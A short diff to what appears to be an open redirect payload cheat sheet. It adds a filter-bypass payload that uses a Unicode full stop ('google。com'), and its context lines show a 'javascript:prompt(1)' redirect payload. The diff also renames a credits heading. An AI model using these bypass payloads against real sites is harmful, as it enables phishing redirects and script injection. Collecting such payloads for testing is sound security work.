@@ -48,6 +48,7 @@ Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)
 Using "%E3%80%82" to bypass "." blacklisted character
 
 ```powershell
+/?redir=google。com
 //google%E3%80%82com
 ```
 
@@ -124,7 +125,7 @@ http://www.example.com/redirect.php?url=javascript:prompt(1)
 ?return_path={payload}
 ```
 
-## Thanks to
+## References
 
 * filedescriptor
 * [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
